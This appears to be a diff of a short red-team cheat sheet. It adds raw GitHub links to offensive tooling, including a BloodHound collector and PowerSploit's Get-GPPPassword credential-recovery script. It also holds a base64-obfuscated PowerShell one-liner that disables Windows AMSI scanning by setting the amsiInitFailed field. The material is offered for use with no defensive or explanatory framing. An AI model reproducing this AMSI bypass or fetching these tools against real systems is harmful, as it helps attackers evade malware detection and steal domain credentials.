@@ -14,6 +14,10 @@ https://raw.githubusercontent.com/BloodHoundAD/BloodHound/refs/heads/master/Coll
 
 https://raw.githubusercontent.com/vinicius-batistella/Rumo/refs/heads/main/blood.txt
 
+https://raw.githubusercontent.com/vinicius-batistella/Rumo/refs/heads/main/gpp.txt
+
+https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Exfiltration/Get-GPPPassword.ps1
+
 ==============================================================================================================================
 
 [Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
